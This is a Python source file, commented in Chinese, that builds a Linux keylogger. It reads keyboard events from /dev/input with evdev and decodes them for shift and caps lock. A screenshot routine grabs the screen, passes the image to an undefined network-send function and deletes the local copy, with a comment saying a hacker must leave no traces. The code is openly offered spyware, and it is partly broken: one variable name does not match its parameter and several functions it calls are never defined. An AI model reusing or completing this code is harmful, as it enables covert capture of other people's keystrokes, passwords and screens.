
import os
import sys
import time
from evdev import InputDevice
from select import select
from evdev import ecodes
from evdev.events import KeyEvent
from functools import partial

'''
input子系统是linux kernel中与外部输入设备联系比较紧密的模块，例如我们的键盘设备会映射到/dev/input目录下的某个设备文件，由于键盘属于字符设备，所以我们可以将其当做普通的文件来操作(比如read、write)。通过不断的读取键盘设备文件,就可以完全获取到用户的键盘输入。

记录键盘输入功能
键盘输入功能模块主要按照以下流程去设计与实现
    找到/dev/input/目录下对应的键盘设备
    使用evdev库获取键盘记录的原始数据
    对原始数据进行解码处理加入到字符缓冲区
    在字符缓冲区冲处理Backspace、Left、Right等特殊按键操作
    将缓冲区中的内容通过socket套接字接口传输到远程服务器
由于运行在docker容器中的linux没有输入子系统，可以借助X11来记录键盘输入


屏幕截图
屏幕截图功能使用了Python调用外部程序技术，常用的库用subprocess、os.system,commands等，在这里我们使用了commands库，
'''


def screen_shot(filename='screen_shot', file_type='png'):
    """
    本程序未实现指定图片存储的路径，用户自行实现该扩展功能
    借助os.path.join函数
    """
    import commands

    print('3秒过后截图')
    time.sleep(3)
    '''
    命令行的截屏工具scrot: sudo apt-get install scrot
    '''
    ret = commands.getstatusoutput("scrot " + file_name + 'tmp.' + file_type)
    if ret[0] != 0:
        print("图片类型不支持，请换用png jpg等常用格式")
        return
    # 读取图像的二进制文件，进行网络传输
    with open(file_name + 'tmp.' + file_type, "rb") as fp:
        send_pic_task(fp.read(), file_type)
    # 删除scrot生成的图片，作为黑客可不能留下痕迹啊
    os.remove(file_name + 'tmp.' + file_type)
    print('发送屏幕截图完成')




'''
找到所有的键盘设备

/dev/input/目录下存在一些字符设备文件，通过对这些文件的读写和控制，可以访问实际设备

需要了解linux的虚拟内存文件系统sysfs, 它挂在于/sys目录，它存储了系统内核和
设备驱动的实时信息，我们要找的键盘设备的信息可以在/sys/class/input目录
下找到，通过查看devices/name可以发现，该文件记录了设备的描述信息。
'''

# linux下的系统输入设备信息目录
DEVICES_PATH = '/sys/class/input/'

def device_filter(dev_content):
    '''
    通过代码实现筛选键盘设备
    dev_content显示了设备的名称和信息
    这里通过关键字查找的方式来判断该设备是否是键盘设备
    '''
    # 如果设备信息出现中出现了keyboard这个关键词，那么就认为是键盘设备
    if "keyboard" in dev_content.lower():
        return True
    return False

def find_keyboard_devices(device_filter_func):
    """
    找出所有的键盘设备名
    """
    # 切换到/sys/class/input/这个目录下，类似cd命令
    os.chdir(DEVICES_PATH)
    result = []
    # 遍历/sys/class/input/下的所有的目录
    for each_input_dev in os.listdir(os.getcwd()):
        # 找到设备信息相关的文件
        dev_path = DEVICES_PATH + each_input_dev + '/device/name'
        # 如果这个设备是键盘设备
        if(os.path.isfile(dev_path) and device_filter_func(file(dev_path).read())):
            result.append('/dev/input/' + each_input_dev)
    if not result:
        print("没有键盘设备")
        # 直接结束该进程
        sys.exit(-1)
    return result


def monitor_keyboard(devs):

    # 将名映射到inputDevice对象
    devices = map(InputDevice, devs)
    # dev.fd一个文件描述符， 然后建立一个字典
    devices = {dev.fd: dev for dev in devices}
    return devices

class CusKeyEvent(KeyEvent):
    all_capital_chars = [chr(i) for i in range(65, 91)]
    all_numbers = [str(i) for i in range(0, 10)]

    def format_output(self, input_num):
        # 将evdev的编码转化为实际输出的字符
        return word_ctoa(input_num)

    def __init__(self, event):
        super(CusKeyEvent, self).__init__(event)

    @property
    def status_code(self):
        """ 表示按键的3种状态， up 表示按键释放， down表示按下
             hold 表示按住不放
        """
        return ("up", "down", "hold")[self.keystate]

    @property
    def key(self):
        """
             evdev拿到的原始数据是数字，需要转换成相应ascii的字符以及数字
        """
        return self.format_output(self.scancode)

    @property
    def type(self):
        """ 键盘上的按键类型非常多，有26个英文字母及数字，
             还有tab 键，left, right, enter键等等
             在这里我们简单的对数据进行一个分类，
             分为： 1. 字符类型 和 2. 数字类型，
             3. 要记录的特殊的类型： enter，backspace, enter, ', ",
             4. 不需要记录的类型

        """
        if self.key.upper() in self.all_capital_chars:
            return "char"
        if self.key.upper() in self.all_numbers:
            return "number"
        if self.key in ("enter", "backspace", ",", "'", "."):
            return "validate"
        return 'unvalidate'

    @property
    def is_show(self):
        # delete操作要删除已经输入的字符
        if self.key == 'backspace' and self.status_code != 'up':
            return True
        # 释放按键的做操后不需要
        if self.status_code == 'up':
            return False
        # 不需要显示的字符
        if self.status_code == 'hold' and (self.type == 'unvalidate'):
            return False
        return True


class StatusManager(object):

    def reverse_status(self, obj):
        """ 如果是true， 那么返回False, 如果是False, 那么返回True"""
        if obj:
            return False
        return True

    def __init__(self, *args, **kwargs):
        """is_shift_press表示有没有同时按住shift,
           同时按住shift和其他按键会导致最后的结果不一样，
           shift + 'c' => 'C'
           shift + '.' = > ">"

           caps 键原因一样, 按一次会变成大写，再按一次会变成小写

           # bug:
               如果在运行本程序之前，caps已经被打开，那么就会导致
               程序记录的字符全是反的，目前没有解决办法
        """
        self.is_shift_press = False
        self.is_caps_lock = False

    def recv_caps_message(self):
        """ 当按了一次caps键后， 会产生这个消息
        """
        self.is_caps_lock = self.reverse_status(self.is_caps_lock)

    def recv_shift_message(self):
        """ shift键被按时，产生这个消息
        """
        self.is_shift_press = self.reverse_status(self.is_shift_press)

    def get_current_key(self, in_str):
        status = False
        # 当caps和shift键没有同时都使用， 那么就需要小写变大写
        if self.is_shift_press != self.is_caps_lock:
            status = True
        if status:
            return in_str.upper()
        # 对特殊字符的处理
        if self.is_shift_press:
            return special_character_handler(in_str, True)
        return in_str

    def __str__(self):
        return "capital status " + str(self.is_shift_press != self.is_caps_lock) + "\n"

def decode_character():
    """
    程序一开始需要维护shift, caps的按键状态,使用闭包避免引用全局变量
    """
    status_manager = StatusManager()

    def wrapper(in_event):
        # 按了shift键,需要注意的是shift 和需要配合其他键一起按，所以需要处理up 和down状态
        if in_event.key == 'shift' and in_event.status_code != 'hold':
            status_manager.recv_shift_message()
        # 按住caps, caps没有hold状态
        elif in_event.key == "capslock" and in_event.status_code != 'up':
            assert in_event.status_code != 'hold'
            status_manager.recv_caps_message()
        elif in_event.type == 'number':
            # 如果是数字直接返回, 避免过多的判断，字母需要根据shift和caps状态进行转化
            return in_event.key
        # 如果判断该按键不需要显示，那么直接返回None， 比如f5按键等
        if not in_event.is_show:
            return None
        result = status_manager.get_current_key(in_event.key)
        return result
    return wrapper

'''
使用evdev获取键盘输入的数据

在这里我们使用evdev库来获取原始的键盘数据，在这里我们使用select库来监听键盘的状态，若有输入时，readers返回键盘的文件描述符，evdev把键盘的输入转化为多个event对象。在这里只需要筛选类型为EV_KEY的键盘输入event对象即可。
'''
def linux_thread_func(file_name, file_type, content_handler, seconds=10):
    # 获取键盘设备
    devices = monitor_keyboard(find_keyboard_devices(device_filter))
    # 维护shift和caps状态， 对evdev库的event对象进行解析
    dec = decode_character()

    now_t = time.time()
    while True:
        if int(time.time() - now_t) >= seconds:
            break
        # select 是监听文件描述符的一个库，监听当前所有的键盘设备
        readers, writes, _ = select(devices.keys(), [], [])
        # readers可能有多个键盘设备，所以是一个数组结构
        for r in readers:
            # 键盘有输入操作
            events = devices[r].read()
            for event in events:
                if event.type == ecodes.EV_KEY:
                    # 转化为自定义的event对象，多了type, status_code属性
                    cus_event = CusKeyEvent(event)
                    # 对event进行解析
                    ret_char = dec(cus_event)
                    if ret_char:
                        print(ret_char)

if __name__ == '__main__':
    linux_thread_func('keyboard', '.txt', None, seconds=10)